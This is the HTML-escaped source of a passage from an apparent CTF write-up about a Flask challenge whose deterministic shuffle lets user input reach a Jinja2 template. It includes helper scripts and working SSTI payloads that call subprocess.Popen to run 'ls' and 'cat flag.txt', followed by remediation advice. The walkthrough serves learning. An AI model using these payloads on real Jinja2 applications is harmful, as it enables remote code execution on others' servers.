&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Flask&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__name__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  
&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;root&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_template_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;&apos;&apos;
        &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;/style.css&quot;&amp;gt;
        &amp;lt;div class=&quot;content&quot;&amp;gt;
            &amp;lt;h1&amp;gt;The windy hills&amp;lt;/h1&amp;gt;
            &amp;lt;form action=&quot;/shout&quot; method=&quot;POST&quot;&amp;gt;
                &amp;lt;input type=&quot;text&quot; name=&quot;text&quot; placeholder=&quot;Hello!&quot;&amp;gt;
                &amp;lt;input type=&quot;submit&quot; value=&quot;Shout your message...&quot;&amp;gt;
            &amp;lt;/form&amp;gt;
            &amp;lt;div style=&quot;color: red;&quot;&amp;gt;&amp;lt;/div&amp;gt;
        &amp;lt;/div&amp;gt;
    &apos;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;error&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;

&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;post&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/shout&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;shout&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;form&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;text&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;not&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;redirect&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/?error=No message provided...&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; 
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;seed&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jumbled&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;list&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;text&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;random&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shuffle&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jumbled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jumbled&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;join&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jumbled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;jumbled&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;rendered&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&apos;
        &amp;lt;link rel=&quot;stylesheet&quot; href=&quot;/style.css&quot;&amp;gt;
        &amp;lt;div class=&quot;content&quot;&amp;gt;
            &amp;lt;h1&amp;gt;The windy hills&amp;lt;/h1&amp;gt;
            &amp;lt;form action=&quot;/shout&quot; method=&quot;POST&quot;&amp;gt;
                &amp;lt;input type=&quot;text&quot; name=&quot;text&quot; placeholder=&quot;Hello!&quot;&amp;gt;
                &amp;lt;input type=&quot;submit&quot; value=&quot;Shout your message...&quot;&amp;gt;
            &amp;lt;/form&amp;gt;
            &amp;lt;div style=&quot;color: red;&quot;&amp;gt;&amp;lt;/div&amp;gt;
            &amp;lt;div&amp;gt;
                Your voice echoes back: %s
            &amp;lt;/div&amp;gt;
        &amp;lt;/div&amp;gt;
    &apos;&apos;&apos;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;%&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;jumbled&lt;/span&gt;
  
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;render_template_string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;rendered&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;error&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;request&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;args&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;error&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
  
&lt;span class=&quot;o&quot;&gt;@&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;/style.css&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;style&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;():&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&apos;&apos;&apos;
        html, body { margin: 0 }
        .content {
            padding: 2rem;
            width: 90%;
            max-width: 900px;
            margin: auto;
            font-family: Helvetica, sans-serif;
            display: flex;
            flex-direction: column;
            gap: 1rem;
        }
    &apos;&apos;&apos;&lt;/span&gt;
  
&lt;span class=&quot;n&quot;&gt;app&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;run&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;debug&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/shout&lt;/code&gt; endpoint, the server takes the value in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;text&lt;/code&gt; field, shuffles it, and interpolates it with the string that will be interpreted as a template. The vulnerability comes from the fact that the randomness is seeded with a hardcoded value (zero), and user input is being passed to a string that will be interpreted as a template.&lt;/p&gt;

&lt;p&gt;A template is a way for simple logic to be embedded into HTML in a way reminiscent of PHP. In my own projects, I use it for for loops and basic conditionals, but depending on the language and the template engine, you can do some very powerful actions, like reading from files, checking for authentication, have local storage, and in our case, execute arbitrary Python code. We can exploit the deterministic nature of the shuffling to inject our syntax that will be interpreted as part of the template. In this case, the language is Jinja2, which typically uses &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\{\{ }}&lt;/code&gt; to denote Jinja code.&lt;/p&gt;

&lt;p&gt;The &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;random.shuffle&lt;/code&gt; function takes in an iterable and swaps around its elements by indices, but it doesn’t look at the value at the index to decide where it should be shuffled to. This means that the string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;hello&lt;/code&gt; will get shuffled the exact same way &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abcde&lt;/code&gt; gets shuffled. All that matters is the length of the string.&lt;/p&gt;

&lt;p&gt;Our goal is to inject code into the template, meaning it needs to be ordered correctly. I created a python script that takes a target string and returns a string of unique characters that is the length of the target. We can enter that string into the website and see how it shuffles it:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;\{\{ dict }}&quot;&lt;/span&gt;
  
&lt;span class=&quot;n&quot;&gt;unique_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ`1234567890-=[]\;&apos;,./~!@#$%^&amp;amp;*()_+{}|:&amp;lt;&amp;gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[:&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)]&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unique_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;This prints out &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;abcdefghij&lt;/code&gt;. We pass that into the website, and it returns the shuffled string &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ecbafd&lt;/code&gt;. We can use a little bit of scripting to build a map that pairs the indices of the original unique string to the shuffled version:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;shuffled_unique_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;hibfdecajg&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shuffled_unique_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  
&lt;span class=&quot;n&quot;&gt;index_map&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;
  
&lt;span class=&quot;k&quot;&gt;assert&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unique_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shuffled_unique_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
  
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char_i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unique_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;index_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shuffled_unique_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;find&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;unique_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;We can then apply this to the target to get a string that when passed through the website, injects the target into the template:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;final_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;&quot;&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;char_i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)):&lt;/span&gt;
&lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;err&quot;&gt; &lt;/span&gt; &lt;span class=&quot;n&quot;&gt;final_str&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;target&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;index_map&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;char_i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]]&lt;/span&gt;
  
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;final_str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;In the case of the target &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\{\{ dict }}&lt;/code&gt;, the shuffled string is:
&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt; ticd}\{\{}&lt;/code&gt;. Passing this through the website results in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;class &apos;dict&apos;&amp;gt;&lt;/code&gt; being printed out, implying a successful injection:
&lt;img src=&quot;assets/images/blog/week9/successful-dict-execution.png&quot; alt=&quot;assets/images/blog/week9/successful-dict-execution.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Now that we can predictably inject code, now we need to decide on an input. Poking around &lt;a href=&quot;https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection/jinja2-ssti&quot;&gt;Hacktricks Jinja2 SSTI page&lt;/a&gt;, it looks like it is possible to access all the functions that the python interpreter has access to using the payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\{\{ dict.__base__.__subclasses__() }}&lt;/code&gt;. To my understanding, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;dict&lt;/code&gt; is a child class of some generic class, who’s children is absolutely every other class in python. Injecting this using the payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;\{_)_utc\{(scas____bl_i.se\}e}dsb.as_&lt;/code&gt; returns a massive list of class that we have at our disposal, including &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subprocess.Popen&lt;/code&gt;, which allows for remote code execution:
&lt;img src=&quot;assets/images/blog/week9/all-classes.png&quot; alt=&quot;assets/images/blog/week9/all-classes.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;We can take this string and use a python interpreter to get how many items are in it:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;[&amp;lt;class &apos;type&apos;&amp;gt;, &amp;lt;class &apos;async_generator&apos;&amp;gt;]...&quot;&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;classes&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;split&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;,&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&amp;gt;&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;len&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;classes&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;mi&quot;&gt;551&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Luckily, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;subprocess.Popen&lt;/code&gt; is the last class in the array, so we can construct a simple payload to access it, run a command, and return the output:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;\&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__base__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;550&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;ls&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;communicate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()}}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Shuffled, this is the payload &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;5_c0e)sssde_.&apos;._]muthrlsc[_u&apos;_Tt)(-=oecs,bdu{n,bs}ia_}l({o1_sitsme_c.e=)utaa(5ll&lt;/code&gt;. Executing this payload returns a successful execution!
&lt;img src=&quot;assets/images/blog/week9/successful-popen.png&quot; alt=&quot;assets/images/blog/week9/successful-popen.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Let’s cat out that flag.txt file by modifying the payload:&lt;/p&gt;
&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;\&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;\&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;dict&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__base__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;__subclasses__&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;550&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;](&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&apos;cat flag.txt&apos;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shell&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;True&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;stdout&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;).&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;communicate&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;()}}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Resulting in a final payload of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;x_(&apos;])_\{\{o_t)l5&apos;,o=cuc_blg.mhdea1(.lcsctT_duin.ca\}eas\})_tb=ftitamel[-rsssuu_.0ea,(5s_tste &lt;/code&gt;:
&lt;img src=&quot;assets/images/blog/week9/flag.png&quot; alt=&quot;assets/images/blog/week9/flag.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;To remedy this, don’t allow user input to be interpolated into a template, and if that is necessary, sanitize the data before it is used and after it is preprocessed.&lt;/p&gt;
&lt;h2 id=&quot;final-thoughts&quot;&gt;Final Thoughts&lt;/h2&gt;
&lt;p&gt;I didn’t have time to tackle some of the more interesting rev and pwn challenges, but I was still impressed by the caliber of challenges. The 3 I did seemed perfectly engineered to teach a single concept, which is often difficult to do. I might &lt;del&gt;steal&lt;/del&gt; take inspiration from the source code for future challenges. I hope I can devote more time to this challenge next year!&lt;/p&gt;
